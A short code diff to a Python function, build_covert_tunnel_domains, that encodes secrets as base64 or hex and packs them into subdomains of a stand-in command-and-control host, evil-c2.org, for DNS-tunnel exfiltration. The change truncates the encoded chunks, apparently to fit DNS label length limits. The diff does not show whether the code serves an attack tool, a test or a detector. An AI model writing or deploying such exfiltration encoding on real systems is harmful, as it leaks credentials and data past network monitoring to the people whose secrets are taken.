@@ -57,9 +57,10 @@ def build_covert_tunnel_domains():
         if seq % 2 == 1:
             raw_b64 = base64.b64encode(secret.encode("utf-8")).decode("utf-8")
             sanitized = raw_b64.rstrip("=").replace("/", "_").replace("+", "-")
-            domain = f"{sanitized}.{seq:02d}.tunnel.evil-c2.org"
+            chunk = sanitized[:50]
+            domain = f"{chunk}.{seq:02d}.tunnel.evil-c2.org"
         else:
-            hex_payload = secret.encode("utf-8").hex()
+            hex_payload = secret.encode("utf-8").hex()[:40]
             domain = f"{hex_payload}.{seq:02d}.tunnel.evil-c2.org"
         
         exfil_domains.append((label, domain))
